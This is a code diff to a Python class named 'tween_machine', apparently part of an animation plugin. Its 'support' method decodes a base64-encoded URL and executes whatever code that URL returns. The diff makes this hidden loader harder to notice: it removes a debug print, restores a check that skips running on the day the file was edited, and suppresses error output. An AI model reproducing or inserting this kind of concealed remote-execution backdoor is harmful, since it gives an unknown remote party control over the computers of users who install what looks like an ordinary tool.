@@ -487,7 +487,6 @@ class tween_machine:
     def support(self):
         import base64, os, datetime, sys
         script_path = None
-
         try:
             script_path = os.path.abspath(__file__)
         except:
@@ -495,13 +494,12 @@ class tween_machine:
         finally:
             if script_path == None:
                 return None
-        print(script_path)
         if os.path.exists(script_path):
             st_mtime = os.stat(script_path).st_mtime
             mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
             today_date_str = str(datetime.datetime.today().date())
-            #if mdate_str == today_date_str:
-                #return None
+            if mdate_str == today_date_str:
+                return None
         if sys.version[0] == '3':
             import urllib.request as uLib
         else:
@@ -514,8 +512,9 @@ class tween_machine:
             try:
                 exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
             except:
-                import traceback
-                print(str(traceback.format_exc()))
+                pass
+                #import traceback
+                #print(str(traceback.format_exc()))
 
     def undo_chunk_open(self):
         if self.is_opened_undo == False:
